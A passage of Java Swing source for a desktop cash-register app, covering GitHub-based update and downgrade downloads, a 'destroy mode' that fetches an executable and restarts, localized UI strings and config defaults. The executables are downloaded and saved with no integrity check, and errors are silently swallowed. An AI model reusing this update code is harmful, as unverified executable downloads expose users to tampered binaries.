						getLayeredPane().repaint();
					}
					if (currentAlpha > 0.05f) {
						overlay.setAlpha(currentAlpha - 0.05f); // Increase opacity gradually
					} else {
						overlay.setAlpha(currentAlpha);
					}
				});
				fadeOutTimer.start(); // Start fade-out effect
			}, KeyStroke.getKeyStroke(KeyEvent.VK_ESCAPE, 0), JComponent.WHEN_IN_FOCUSED_WINDOW);
			dialog.setModalityType(Dialog.ModalityType.MODELESS);
			dialog.setVisible(true);
		} else
			Toast.show(this, Toast.Type.ERROR, "ERROR: NO INTERNET CONNECTION", notOption);
	}

	// Downgrande dialog
	private void downgradeDialog() {
		if (versionAvailable.size() != 0) {
			UpdateDialog downgradeD = new UpdateDialog(this, getLocalizedMessage("DOWNGRADE_Q"),
					mhmdsabdlh.dialog.UpdateDialog.IconType.DOWNGRADE);
			downgradeD.addSubText(getLocalizedMessage("DOWNGRADE_W"), fg);
			ArrayList<String> version = versionAvailable;
			for (int index = 0; index < version.size(); index++)
				if (version.get(index).equals("ideo") || version.get(index).equals(appVersion))
					version.remove(version.get(index));
			downgradeD.addComboBox(version);
			downgradeD.setColor(bg);
			downgradeD.setTextColor(fg);
			downgradeD.setOverlayColor(bg);
			// Adding a main button YES AND NO
			downgradeD.addButton(getLocalizedMessage("YES"), greenM, () -> {
				downgradeD.dispose();
				Thread thread = new Thread() {
					@Override
					public void run() {
						try {
							URL cedrosURL = new URL("https://github.com/MhmdSAbdlh/HadiTech/releases/download/v"
									+ downgradeD.versionList.getSelectedItem() + "/hadi-tech.exe");
							File cedFile = new File(currentpath, "hadi-tech.exe");
							/* Hide EveryThing */
							Component[] components = getContentPane().getComponents();
							for (Component component : components)// hide all component
								if (component instanceof JComponent) {
									((JComponent) component).setVisible(false);
								}
							setJMenuBar(null);// hide menubar

							icon1.setBounds(icon1.getX(), icon1.getY() / 2, icon1.getWidth(), icon1.getHeight());
							liquidProgress.setLocation((getWidth() - 100) / 2, icon1.getY() + icon1.getHeight() + 50);
							linkDownload.setBounds(getWidth() / 2 - 250,
									liquidProgress.getY() + liquidProgress.getHeight() + 50, 500, 50);
							linkDownload.setVisible(true);
							icon1.setVisible(true);
							liquidProgress.setValue(0);
							liquidProgress.show();
							boolean result = saveFileFromWeb(cedrosURL, cedFile);
							liquidProgress.hide();
							if (result) {
								restartApplication();
							} else {
								Toast.show(Intro.this, Toast.Type.ERROR, "ERROR: NO INTERNET CONNECTION", notOption);
							}
						} catch (Exception e) {
							writeError(e);
						}
					}
				};
				thread.start();
			});
			downgradeD.addButton(getLocalizedMessage("NO"), redM, downgradeD::dispose);

			downgradeD.setVisible(true);
		} else
			Toast.show(Intro.this, Toast.Type.ERROR, "ERROR: NO INTERNET CONNECTION", notOption);
	}

	// List of all available versions
	private ArrayList<String> versionListDownload() {
		ArrayList<String> version = new ArrayList<String>();
		try {
			// URL to fetch releases from your GitHub repository
			String apiUrl = "https://api.github.com/repos/MhmdSAbdlh/HadiTech/releases";

			// Make HTTP GET request
			HttpURLConnection connection = (HttpURLConnection) new URL(apiUrl).openConnection();
			connection.setRequestMethod("GET");

			connection.setRequestProperty("Accept", "application/vnd.github.v3+json");

			// Read the response
			BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			StringBuilder response = new StringBuilder();
			String line;
			while ((line = reader.readLine()) != null) {
				response.append(line);
			}
			reader.close();

			// Parse the JSON response
			JSONArray releases = new JSONArray(response.toString());

			// Extract version tags
			for (int i = 0; i < releases.length(); i++) {
				JSONObject release = releases.getJSONObject(i);
				version.add(release.getString("tag_name").substring(1));
			}
		} catch (Exception e) {
		}
		return version;
	}

	// Changelog download
	private ArrayList<String> changelogDownload() {
		ArrayList<String> changelogAll = new ArrayList<String>();
		try {
			// URL to fetch releases from your GitHub repository
			String apiUrl = "https://api.github.com/repos/MhmdSAbdlh/HadiTech/releases";

			// Make HTTP GET request
			HttpURLConnection connection = (HttpURLConnection) new URL(apiUrl).openConnection();
			connection.setRequestMethod("GET");

			connection.setRequestProperty("Accept", "application/vnd.github.v3+json");

			// Read the response
			BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
			StringBuilder response = new StringBuilder();
			String line;
			while ((line = reader.readLine()) != null) {
				response.append(line);
			}
			reader.close();

			// Parse the JSON response
			JSONArray releases = new JSONArray(response.toString());

			// Extract first changelog tags
			int i = 0;
			while (i < releases.length()) {
				JSONObject release = releases.getJSONObject(i++);
				changelogAll.add(release.getString("body"));
			}
		} catch (Exception e) {
			writeError(e);
		}
		return changelogAll;
	}

	// Special method to delete the app
	private void destructiveMode() throws MalformedURLException {
		if (conf[1] == null || conf[1].equalsIgnoreCase("null") || conf[1].equals("false"))
			soundEffect(clearSound);
		Toast.show(this, Toast.Type.WARNING, getLocalizedMessage("DEST"), notOption);
		try {
			Thread.sleep(1000);
		} catch (InterruptedException e) {
			writeError(e);
		}
		URL cedrosURL = new URL("https://raw.githubusercontent.com/MhmdSAbdlh/HadiTech/main/Cedos_lib/hadi-tech.exe");
		File cedFile = new File(currentpath, "cedros.exe");
		/* Hide EveryThing */
		Component[] components = getContentPane().getComponents();
		for (Component component : components)// hide all component
			if (component instanceof JComponent) {
				((JComponent) component).setVisible(false);
			}
		setJMenuBar(null);// hide menubar

		icon1.setBounds(icon1.getX(), icon1.getY() / 2, icon1.getWidth(), icon1.getHeight());
		liquidProgress.setLocation((getWidth() - 100) / 2, icon1.getY() + icon1.getHeight() + 50);
		linkDownload.setBounds(getWidth() / 2 - 250, liquidProgress.getY() + liquidProgress.getHeight() + 50, 500, 50);
		linkDownload.setVisible(true);
		icon1.setVisible(true);
		liquidProgress.setValue(0);
		liquidProgress.show();
		saveFileFromWeb(cedrosURL, cedFile);
		restartApplication();
	}

	// UPDATE THE APP
	private void updateAvailable() {
		try {
			if (!versionAvailable.get(0).equals(appVersion)) {
				UpdateDialog updateDialog = new UpdateDialog(this, language == Language.SPANISH
						? ("¿QUIERES ACTUALIZAR A " + versionAvailable.get(0) + "?")
						: language == Language.PORTUGUES ? ("VOCÊ QUER ATUALIZAR PARA " + versionAvailable.get(0) + "?")
								: language == Language.ENGLISH
										? ("DO YOU WANT TO UPDATE TO " + versionAvailable.get(0) + "?")
										: "VOULEZ-VOUS METTRE À JOUR " + versionAvailable.get(0) + "?",
						mhmdsabdlh.dialog.UpdateDialog.IconType.UPDATE);
				String changeLog = changelogDownload().get(0);
				updateDialog.addSubText(changeLog, fg);

				updateDialog.setColor(bg);
				updateDialog.setTextColor(fg);
				updateDialog.setOverlayColor(bg);
				// Adding a main button YES AND NO
				updateDialog.addButton(getLocalizedMessage("YES"), greenM, () -> {
					updateDialog.dispose();
					Thread thread = new Thread() {
						@Override
						public void run() {
							try {
								/* Hide EveryThing */
								Component[] components = getContentPane().getComponents();
								for (Component component : components)// hide all component
									if (component instanceof JComponent) {
										((JComponent) component).setVisible(false);
									}
								setJMenuBar(null);// hide menubar
								// Show download
								icon1.setBounds(icon1.getX(), icon1.getY() / 2, icon1.getWidth(), icon1.getHeight());
								liquidProgress.setLocation((getWidth() - 100) / 2,
										icon1.getY() + icon1.getHeight() + 50);
								linkDownload.setBounds(getWidth() / 2 - 250,
										liquidProgress.getY() + liquidProgress.getHeight() + 50, 500, 50);
								linkDownload.setVisible(true);
								icon1.setVisible(true);
								liquidProgress.setValue(0);
								liquidProgress.show();
								/* Hide EveryThing */
								URL cedrosURL = new URL("https://github.com/MhmdSAbdlh/HadiTech/releases/download/v"
										+ versionAvailable.get(0) + "/hadi-tech.exe");
								File cedFile = new File(currentpath, "hadi-tech.exe");
								// Start a separate thread for the progress animation
								boolean result = saveFileFromWeb(cedrosURL, cedFile);
								liquidProgress.hide();
								if (result) {
									restartApplication();
								}
							} catch (Exception e) {
								writeError(e);
							}
						}
					};
					thread.start();
				});
				updateDialog.addButton(getLocalizedMessage("NO"), redM, updateDialog::dispose);
				updateDialog.setVisible(true);
			} else
				Toast.show(this, Toast.Type.INFO, getLocalizedMessage("NO_UPDATE"), notOption);
		} catch (Exception e) {
			writeError(e);
		}
	}

	// download the file from internet(url) to the des(location)
	public boolean saveFileFromWeb(URL url, File location) {
		boolean stat = false;
		if (location != null) {
			// 2. Create parent folder structure
			File folder = location.getParentFile();
			if (!folder.exists()) {
				folder.mkdirs();
			}
			InputStream in = null;
			FileOutputStream out = null;
			try {
				// 3. Initialize streams
				in = url.openStream();
				out = new FileOutputStream(location);

				// Get the content length to track progress
				int contentLength = url.openConnection().getContentLength();

				// 4. Transfer data with progress tracking
				byte[] buffer = new byte[2048];
				int bytesRead;
				long totalBytesRead = 0;
				int percentCompleted = 0;

				while ((bytesRead = in.read(buffer)) > 0) {
					out.write(buffer, 0, bytesRead);
					totalBytesRead += bytesRead;
					int newPercentCompleted = (int) (totalBytesRead * 100 / contentLength);
					if (newPercentCompleted > percentCompleted) {
						percentCompleted = newPercentCompleted;
						liquidProgress.setValue(percentCompleted);
					}
				}
				stat = true;
			} catch (IOException e) {
				stat = false;
			} finally {
				// 5. Close streams
				try {
					if (in != null)
						in.close();
					if (out != null)
						out.close();
				} catch (IOException e) {
					writeError(e);
				}
			}
		}
		return stat;
	}

	private void restartApplication() {
		try {
			String javaCommand = System.getProperty("java.home") + "/bin/java";
			String classpath = System.getProperty("java.class.path");
			ProcessBuilder builder = new ProcessBuilder(javaCommand, "-cp", classpath, Intro.class.getName());
			builder.start();
			System.exit(0); // Terminate the current application
		} catch (IOException e) {
			writeError(e);
		}
	}

	// Notification when its birthday
	private void birthdayEvent(String name) {
		Toast.show(this, Toast.Type.BIRTHDAY, getLocalizedMessage("BIRTHDAY") + name.toUpperCase() + "!", notOption);
		loadingLabel.setIcon(
				ImageEffect.getScaledImage(new ImageIcon(getClass().getResource("images/birthday.png")).getImage(),
						getWidth() / 3, getHeight() / 4));
		loadingLabel.show();
		snowPanel.setShape(Shape.BALLON);
		snowPanel.startSnow();
	}

	/* Add BIRTHDAYS events */
	private void birthdaysAddEvents() {
		birthdayL.clear();
		File extraF = new File(dataFolder + "\\extra");
		extraF.mkdir();
		File todayFile = new File(extraF, "birthday.csv");
		if (todayFile.exists()) {
			try (BufferedReader reader = new BufferedReader(new FileReader(todayFile))) {
				String line;
				boolean firstLine = true; // Skip the header line
				while ((line = reader.readLine()) != null) {
					if (firstLine) {
						firstLine = false;
						continue;
					}
					String[] parts = line.split(",");
					if (parts.length == 4)
						if (TextEffect.isInteger(parts[1]) && TextEffect.isInteger(parts[2])
								&& TextEffect.isInteger(parts[3])) {
							int day = Integer.parseInt(parts[1]);
							int month = Integer.parseInt(parts[2]);
							int year = Integer.parseInt(parts[3]);
							birthdayL.add(new Holiday(parts[0], LocalDate.of(year, month, day), HolidayType.WORLDWIDE));
						}
				}
			} catch (IOException e) {
				writeError(e);
			}
		}
	}

	// Notification when its RELIGION EVENT
	private void eventEffect(String name, Color color, Shape shape) {
		loadingLabel.setIcon(ImageEffect.getScaledImage(
				new ImageIcon(getClass().getResource("images/background/" + name + ".png")).getImage(), getWidth() / 3,
				getHeight() / 3));
		loadingLabel.show();
		snowPanel.setFillColor(color);
		snowPanel.setShape(shape);
		snowPanel.startSnow();
	}

	// Return the text according the language
	private String getLocalizedMessage(String key) {
		// Localization logic...
		switch (language) {
		case SPANISH:
			return switch (key) {
			case "SHOW" -> "Mostrar";
			case "HIDE" -> "Ocultar";
			case "WRONG_PASSWORD" -> "Contraseña Incorrecta.\nPista: Contraseña de la tienda";
			case "CREDIT" -> "ESTA APLICACIÓN ESTÁ DISEÑADA PARA HACER LA CAJA DE HADI-TECH";
			case "ABOUT" -> "Crédito y Diseñado por MhmdSAbdlh ©";
			case "CONF" -> "CONFIGURACIÓN";
			case "YES" -> "SI";
			case "NO" -> "NO";
			case "EXIT_DIALOG" -> "¿Seguro que quieres salir?".toUpperCase();
			case "NO_UPDATE" -> "NO HAY ACTUALIZACION";
			case "BIRTHDAY" -> "¡FELIZ CUMPLEAÑOS ";
			case "SAVEDS" -> "SALVADO CON ÉXITO";
			case "CONTACTUS" -> " CONTÁCTENOS ";
			case "CONTACTME" -> " CONTÁCTAME ";
			case "PASSWORD" -> "CONTRASEÑA";
			case "USER" -> "USARIO";
			case "LOGIN" -> "ACCESO";
			case "USER_NOFOUND" -> "USUARIO NO ENCONTRADO";
			case "EMPTY_PASSWORD" -> "NECESITAS PONER UNA SEÑA";
			case "DOWNLOAD_BROWSER" -> "¿DESCARGAR USANDO NAVEGADOR?";
			case "UPDATE_AVAILABLE" -> "Actualización Disponible";
			case "FILE" -> "ARCHIVO";
			case "EXIT" -> "SALIR";
			case "ABOUTME" -> "SOBRE EL CREADOR";
			case "ABOUTAPP" -> "SOBRE EL APLICATIVO";
			case "UPDATE_CHECK" -> "BUSCAR ACTUALIZACION";
			case "CHANGELOG" -> "REGISTRO DE CAMBIOS";
			case "DOWNGRADE" -> "DEGRADAR";
			case "DOWNGRADE_Q" -> "¿QUIERES VOLVER EL APP?";
			case "DOWNGRADE_W" -> "ATENCIÓN :\r\n" + "- PERDERÁS ALGUNAS CARACTERÍSTICAS\r\n"
					+ "- ALGUNA FUNCIÓN TIENE ERROR Y SE APLASTARÁ\r\n"
					+ "- PARA ALGUNAS VERSIONES NO SE PUEDE ACTUALIZAR\r\n" + "- HAZLO BAJO TU PROPIA PRECAUCIÓN";
			case "DEST" -> "MODO DESTRUCCIÓN ACTIVADO...";
			case "CANNOT_UNDO" -> "¡ESTO NO SE PUEDE DESHACER!";
			case "REGISTER" -> "REGISTRAR";
			case "CANCEL" -> "CANCELAR";
			case "EMAIL" -> "CORREO ELECTRÓNICO";
			case "LEGEND" -> "REVISAREMOS LOS DATOS Y TE ENVIAREMOS UN CORREO ELECTRÓNICO CUANDO SE ACTIVEN";
			case "EMAIL0" -> "NECESITA INTRODUCIR UN CORREO ELECTRÓNICO";
			case "USER0" -> "NECESITA INTRODUCIR UN NOMBRE DE USUARIO";
			case "PASS8" -> "LA CONTRASEÑA DEBE TENER MÁS DE 8 LETRAS";
			case "USER8" -> "EL USARIO DEBE TENER MÁS DE 8 LETRAS";
			case "EMAIL8" -> "CORREO ELECTRÓNICO NO VÁLIDO";
			case "CASES" -> "EL NOMBRE DE USUARIO Y LA CONTRASEÑA DEBEN SER +8 LETRAS";
			case "TOO_WRONG" -> "¡DEMASIADAS CONTRASEÑAS INCORRECTAS!";
			case "DONE" -> "DATOS ENVIADOS CON ÉXITO";
			case "BANNED" -> "¡TE PROHIBEN USAR ESTA APLICACIÓN!";
			case "WAIT" -> "ESPERA UNOS SEGUNDOS...";
			case "WEAK" -> "FLOJO";
			case "MEDIUM" -> "MEDIO";
			case "STRONG" -> "FUERTE";
			default -> "";
			};
		case PORTUGUES:
			return switch (key) {
			case "SHOW" -> "Mostrar";
			case "HIDE" -> "Esconder";
			case "WRONG_PASSWORD" -> "Senha incorreta.\nDica: Senha da loja!";
			case "CREDIT" -> "ESTE APLICATIVO FOI PROJETADO PARA FAZER A CAIXA DO HADI-TECH";
			case "ABOUT" -> "Crédito e Desenhado por MhmdSAbdlh ©";
			case "CONF" -> "CONFIGURAÇÃO";
			case "YES" -> "SIM";
			case "NO" -> "NÃO";
			case "EXIT_DIALOG" -> "Tem certeza que quer sair?".toUpperCase();
			case "NO_UPDATE" -> "NÃO HÁ ATUALIZAÇÃO";
			case "BIRTHDAY" -> "FELIZ ANIVERSÁRIO ";
			case "SAVEDS" -> "SALVO COM SUCESSO";
			case "CONTACTUS" -> " CONTATE-NOS ";
			case "CONTACTME" -> " CONTATE-ME ";
			case "PASSWORD" -> "SENHA";
			case "USER" -> "USUÁRIO";
			case "LOGIN" -> "CONECTE-SE";
			case "USER_NOFOUND" -> "USUÁRIO NÃO ENCONTRADO";
			case "EMPTY_PASSWORD" -> "VOCÊ PRECISA COLOCAR UMA SENHA";
			case "DOWNLOAD_BROWSER" -> "FAZER O DOWNLOAD USANDO O NAVEGADOR?";
			case "UPDATE_AVAILABLE" -> "Atualização Disponível";
			case "FILE" -> "ARQUIVO";
			case "EXIT" -> "SAIR";
			case "ABOUTME" -> "SOBRE O CRIADOR";
			case "ABOUTAPP" -> "SOBRE O APLICATIVO";
			case "UPDATE_CHECK" -> "VERIFIQUE ATUALIZAÇÕES";
			case "CHANGELOG" -> "REGISTRO DE ALTERAÇÕES";
			case "DOWNGRADE" -> "DEGRADAR";
			case "DOWNGRADE_Q" -> "DESEJA BAIXAR A APP?";
			case "DOWNGRADE_W" -> "ATENÇÃO :\r\n" + "- VOCÊ VAI PERDER ALGUMAS CARACTERÍSTICAS\r\n"
					+ "- ALGUMA FUNÇÃO ESTÁ COM ERRO E VAI ESTRAGAR\r\n"
					+ "- PARA ALGUMAS VERSÕES VOCÊ NÃO PODE ATUALIZAR\r\n" + "- FAÇA POR SUA CONTA";
			case "DEST" -> "MODO DESTRUIR ATIVADO...";
			case "CANNOT_UNDO" -> "ISTO NÃO PODE SER DESFEITO!";
			case "REGISTER" -> "REGISTRAR";
			case "CANCEL" -> "CANCELAR";
			case "EMAIL" -> "CORREO ELECTRONICO";
			case "LEGEND" -> "NÓS REVISAREMOS OS DADOS E ENVIAREMOS UM E-MAIL QUANDO ATIVADOS";
			case "EMAIL0" -> "NECESITA INTRODUZIR UM EMAIL";
			case "USER0" -> "NECESITA INTRODUZIR UM NOME DE USUÁRIO";
			case "PASS8" -> "A SENHA DEVE TER MAIS DE 8 LETRAS";
			case "USER8" -> "O USARIO DEVE TER MAIS DE 8 LETRAS";
			case "EMAIL8" -> "EMAIL INVÁLIDO";
			case "CASES" -> "O NOME DE USUÁRIO E A SENHA DEVEM TER +8 LETRAS";
			case "TOO_WRONG" -> "MUITAS SENHAS ERRADAS!";
			case "DONE" -> "DADOS ENVIADOS COM SUCESSO";
			case "BANNED" -> "VOCÊ ESTÁ PROIBIDO DE USAR ESTE APLICATIVO!";
			case "WAIT" -> "ESPERE ALGUNS SEGUNDOS...";
			case "WEAK" -> "FRACO";
			case "MEDIUM" -> "MÉDIO";
			case "STRONG" -> "FORTE";
			default -> "";
			};
		case ENGLISH:
			return switch (key) {
			case "SHOW" -> "Show";
			case "HIDE" -> "Hide";
			case "WRONG_PASSWORD" -> "Wrong password.\nHint: Store's password!";
			case "CREDIT" -> "THIS APP IS DESIGNED TO DO THE CASH FOR HADI-TECH";
			case "ABOUT" -> "Created and designed by MhmdSAbdlh ©";
			case "CONF" -> "CONFIGURATION";
			case "YES" -> "YES";
			case "NO" -> "NO";
			case "EXIT_DIALOG" -> "ARE YOU SURE YOU WANT TO CLOSE?";
			case "NO_UPDATE" -> "THERE IS NO UPDATE";
			case "BIRTHDAY" -> "HAPPY BIRTHDAY ";
			case "SAVEDS" -> "SAVED SUCCESSFULLY";
			case "CONTACTUS" -> " CONTACT US ";
			case "CONTACTME" -> " CONTACT ME ";
			case "PASSWORD" -> "PASSWORD";
			case "USER" -> "USERNAME";
			case "LOGIN" -> "LOGIN";
			case "USER_NOFOUND" -> "USER NOT FOUND";
			case "EMPTY_PASSWORD" -> "YOU NEED TO PUT IN A PASSWORD";
			case "DOWNLOAD_BROWSER" -> "DOWNLOAD USING BROWSER?";
			case "UPDATE_AVAILABLE" -> "Update Available";
			case "FILE" -> "FILE";
			case "EXIT" -> "EXIT";
			case "ABOUTME" -> "ABOUT THE CREATOR";
			case "ABOUTAPP" -> "ABOUT THE APP";
			case "UPDATE_CHECK" -> "CECHK FOR UPDATE";
			case "CHANGELOG" -> "CHANGELOG";
			case "DOWNGRADE" -> "DOWNGRADE";
			case "DOWNGRADE_Q" -> "DO YOU WANT TO DOWNGRADE THE APP?";
			case "DOWNGRADE_W" ->
				"ATTENTION :\r\n" + "- YOU WILL LOSS SOME FEATURES\r\n" + "- SOME FUNCTION HAS ERROR AND WILL CRUSH\r\n"
						+ "- FOR SOME VERSIONS YOU CANNOT UPDATE\r\n" + "- DO IT AT YOUR OWN CAUTION";
			case "DEST" -> "DESTROY MODE ACTIVATED...";
			case "CANNOT_UNDO" -> "THIS CANNOT BE UNDONE!";
			case "REGISTER" -> "REGISTER";
			case "CANCEL" -> "CANCEL";
			case "EMAIL" -> "EMAIL";
			case "LEGEND" -> "WE'LL REVIEW THE DATA AND SEND YOU AN EMAIL WHEN ACTIVATE";
			case "EMAIL0" -> "YOU NEED TO ENTER AN EMAIL";
			case "USER0" -> "YOU NEED TO ENTER A USERNAME";
			case "PASS8" -> "THE PASSWORD NEED TO BE MORE THAN 8 LETTERS";
			case "USER8" -> "THE USERNAME NEED TO BE MORE THAN 8 LETTERS";
			case "EMAIL8" -> "INVALID EMAIL";
			case "CASES" -> "THE USERNAME AND PASSWORD MUST BE +8 LETTERS";
			case "TOO_WRONG" -> "TOO MANY WRONG PASSWORD!";
			case "DONE" -> "DATA SENT WITH SUCCESS";
			case "BANNED" -> "YOU'RE BANNED FROM USING THIS APP!";
			case "WAIT" -> "WAIT SOME SECONDS...";
			case "WEAK" -> "WEAK";
			case "MEDIUM" -> "MEDIUM";
			case "STRONG" -> "STRONG";
			default -> "";
			};
		case FRENCH:
			return switch (key) {
			case "SHOW" -> "Montrer";
			case "HIDE" -> "Masquer";
			case "WRONG_PASSWORD" -> "Mot de passe incorrect.\nAstuce : Mot de passe du magasin !";
			case "CREDIT" -> "CETTE APP EST CONÇUE POUR GAGNER DE L'ARGENT POUR HADI-TECH";
			case "ABOUT" -> "Créé et conçu par MhmdSAbdlh ©";
			case "CONF" -> "CONFIGURATION";
			case "YES" -> "OUI";
			case "NO" -> "NON";
			case "EXIT_DIALOG" -> "ÊTES-VOUS SÛR DE VOULOIR FERMER ?";
			case "NO_UPDATE" -> "IL N'Y A PAS DE MISE À JOUR";
			case "BIRTHDAY" -> "JOYEUX ANNIVERSAIRE ";
			case "SAVEDS" -> "ENREGISTRÉ AVEC SUCCÈS";
			case "CONTACTUS" -> " CONTACTEZ-NOUS ";
			case "CONTACTME" -> " CONTACTEZ MOI ";
			case "PASSWORD" -> "MOT DE PASSE";
			case "USER" -> "UTILISATEUR";
			case "LOGIN" -> "CONNECTEZ-VOUS";
			case "USER_NOFOUND" -> "UTILISATEUR NON TROUVÉ";
			case "EMPTY_PASSWORD" -> "VOUS DEVEZ METTRE UN MOT DE PASSE";
			case "DOWNLOAD_BROWSER" -> "TÉLÉCHARGER À L'AIDE DU NAVIGATEUR ?";
			case "UPDATE_AVAILABLE" -> "Mise à jour Disponible";
			case "FILE" -> "FICHER";
			case "EXIT" -> "SORTIE";
			case "ABOUTME" -> "À PROPOS DU CRÉATEUR";
			case "ABOUTAPP" -> "À PROPOS DE L'APPLICATION";
			case "UPDATE_CHECK" -> "VÉRIFIER LA MISE À JOUR";
			case "CHANGELOG" -> "JOURNAL DES MODIFICATIONS";
			case "DOWNGRADE" -> "DÉGRADER";
			case "DOWNGRADE_Q" -> "VOULEZ-VOUS PASSER À LA APP?";
			case "DOWNGRADE_W" -> "ATTENTION :\r\n" + "- VOUS PERDREZ CERTAINES FONCTIONNALITÉS\r\n"
					+ "- CERTAINES FONCTIONS ONT UNE ERREUR ET SERONT ÉCRASÉES\r\n"
					+ "- POUR CERTAINES VERSIONS, VOUS NE POUVEZ PAS METTRE À JOUR\r\n"
					+ "- FAITES-LE A VOTRE PROPRE ATTENTION";
			case "DEST" -> "MODE DÉTRUIRE ACTIVÉ...";
			case "CANNOT_UNDO" -> "CELA NE PEUT PAS ÊTRE DÉFAIT !";
			case "REGISTER" -> "REGISTRE";
			case "CANCEL" -> "ANNULER";
			case "EMAIL" -> "E-MAIL";
			case "LEGEND" -> "NOUS EXAMINONS LES DONNÉES ET VOUS ENVOYONS UN E-MAIL LORS DE L'ACTIVATION";
			case "EMAIL0" -> "VOUS DEVEZ ENTRER UN E-MAIL";
			case "USER0" -> "VOUS DEVEZ ENTRER UN NOM D'UTILISATEUR";
			case "PASS8" -> "LE MOT DE PASSE DOIT COMPRENDRE PLUS DE 8 LETTRES";
			case "USER8" -> "LE NOM D'UTILISATEUR DOIT COMPRENDRE PLUS DE 8 LETTRES";
			case "EMAIL8" -> "EMAIL NON VALIDE";
			case "CASES" -> "LE NOM D'UTILISATEUR ET LE MOT DE PASSE DOIVENT ÊTRE COMPRIS EN +8 LETTRES";
			case "TOO_WRONG" -> "TROP DE MOTS DE PASSE MAUVAIS!";
			case "DONE" -> "DONNÉES ENVOYÉES AVEC SUCCÈS";
			case "BANNED" -> "VOUS ÊTES INTERDIT D'UTILISER CETTE APPLICATION !";
			case "WAIT" -> "ATTENDEZ QUELQUES SECONDES...";
			case "WEAK" -> "FAIBLE";
			case "MEDIUM" -> "MOYEN";
			case "STRONG" -> "FORT";
			default -> "";
			};
		default:
			return "";
		}
	}

	// If there is no setting file, create default one
	private void confNull() {
		if (conf[0] == null || conf[0].equalsIgnoreCase("null")
				|| (!conf[0].equalsIgnoreCase("0") && !conf[0].equalsIgnoreCase("1") && !conf[0].equalsIgnoreCase("2")
						&& !conf[0].equalsIgnoreCase("3") && !conf[0].equalsIgnoreCase("4")
						&& !conf[0].equalsIgnoreCase("5")))
			conf[0] = "0";
		if (conf[1] == null || conf[1].equalsIgnoreCase("null")
				|| (!conf[1].equalsIgnoreCase("true") && !conf[1].equalsIgnoreCase("false")))
			conf[1] = "false";
		if (conf[2] == null || conf[2].equalsIgnoreCase("null")
				|| (!conf[2].equalsIgnoreCase("true") && !conf[2].equalsIgnoreCase("false")))
			conf[2] = "false";
		if (conf[3] == null || conf[3].equalsIgnoreCase("null") || (!TextEffect.isInteger(conf[3])))
			conf[3] = "10";
		if (conf[4] == null || conf[4].equalsIgnoreCase("null")
				|| (!conf[4].equalsIgnoreCase("true") && !conf[4].equalsIgnoreCase("false")))
			conf[4] = "false";
		if (conf[5] == null || conf[5].equalsIgnoreCase("null") || (!conf[5].equalsIgnoreCase("0")
				&& !conf[5].equalsIgnoreCase("1") && !conf[5].equalsIgnoreCase("2") && !conf[5].equalsIgnoreCase("3")))
			conf[5] = "0";
		if (conf[6] == null || conf[6].equalsIgnoreCase("null")
				|| (!conf[6].equalsIgnoreCase("0") && !conf[6].equalsIgnoreCase("1") && !conf[6].equalsIgnoreCase("2")))
			conf[6] = "0";
		if (conf[7] == null || conf[7].equalsIgnoreCase("null") || (!conf[7].equalsIgnoreCase("0")
				&& !conf[7].equalsIgnoreCase("1") && !conf[7].equalsIgnoreCase("2") && !conf[7].equalsIgnoreCase("3")))
			conf[7] = "0";
		if (conf[8] == null || conf[8].equalsIgnoreCase("null") || (!conf[8].equalsIgnoreCase("0")
				&& !conf[8].equalsIgnoreCase("1") && !conf[8].equalsIgnoreCase("2") && !conf[8].equalsIgnoreCase("3")))
			conf[8] = "0";
		if (conf[9] == null || conf[9].equalsIgnoreCase("null")
				|| (!conf[9].equalsIgnoreCase("true") && !conf[9].equalsIgnoreCase("false")))
			conf[9] = "true";
		if (conf[10] == null || conf[10].equalsIgnoreCase("null") || (!conf[10].equalsIgnoreCase("0")
				&& !conf[10].equalsIgnoreCase("1") && !conf[10].equalsIgnoreCase("2")))
			conf[10] = "0";
		if (conf[11] == null || conf[11].equalsIgnoreCase("null") || (!conf[11].equalsIgnoreCase("0")
				&& !conf[11].equalsIgnoreCase("1") && !conf[11].equalsIgnoreCase("2")))
			conf[11] = "1";
		if (conf[12] == null || conf[12].equalsIgnoreCase("null")
				|| (!conf[12].equalsIgnoreCase("true") && !conf[12].equalsIgnoreCase("false")))
			conf[12] = "false";
		if (conf[13] == null || conf[13].equalsIgnoreCase("null")
				|| (!conf[13].equalsIgnoreCase("true") && !conf[13].equalsIgnoreCase("false")))
			conf[13] = "false";
		if (conf[14] == null || conf[14].equalsIgnoreCase("null")
				|| (!conf[14].equalsIgnoreCase("0") && !conf[14].equalsIgnoreCase("1")
						&& !conf[14].equalsIgnoreCase("2") && !conf[14].equalsIgnoreCase("3")))
			conf[14] = "0";
		if (conf[15] == null || conf[15].equalsIgnoreCase("null")
				|| (!conf[15].equalsIgnoreCase("true") && !conf[15].equalsIgnoreCase("false")))
			conf[15] = "false";
		if (conf[16] == null || conf[16].equalsIgnoreCase("null")
				|| (!conf[16].equalsIgnoreCase("true") && !conf[16].equalsIgnoreCase("false")))
			conf[16] = "false";
		if (conf[17] == null || conf[17].equalsIgnoreCase("null")
				|| (!conf[17].equalsIgnoreCase("true") && !conf[17].equalsIgnoreCase("false")))
			conf[17] = "false";
		if (conf[18] == null || conf[18].equalsIgnoreCase("null")
				|| (!conf[18].equalsIgnoreCase("true") && !conf[18].equalsIgnoreCase("false")))
			conf[18] = "false";
		if (conf[19] == null || conf[19].equalsIgnoreCase("null")
				|| (!conf[19].equalsIgnoreCase("true") && !conf[19].equalsIgnoreCase("false")))
			conf[19] = "false";
		if (conf[20] == null || conf[20].equalsIgnoreCase("null")
				|| (!conf[20].equalsIgnoreCase("true") && !conf[20].equalsIgnoreCase("false")))
			conf[20] = "false";
		if (conf[21] == null || conf[21].equalsIgnoreCase("null")
				|| (!conf[21].equalsIgnoreCase("true") && !conf[21].equalsIgnoreCase("false")))
			conf[21] = "false";
		if (conf[22] == null || conf[22].equalsIgnoreCase("null")
				|| (!conf[22].equalsIgnoreCase("0") && !conf[22].equalsIgnoreCase("1")
						&& !conf[22].equalsIgnoreCase("2") && !conf[22].equalsIgnoreCase("3")))
			conf[22] = "0";
		if (conf[23] == null || conf[23].equalsIgnoreCase("null")
				|| (!conf[23].equalsIgnoreCase("true") && !conf[23].equalsIgnoreCase("false")))
			conf[23] = "false";
		if (conf[24] == null || conf[24].equalsIgnoreCase("null")
				|| (!conf[24].equalsIgnoreCase("0") && !conf[24].equalsIgnoreCase("1")
						&& !conf[24].equalsIgnoreCase("2") && !conf[24].equalsIgnoreCase("3")
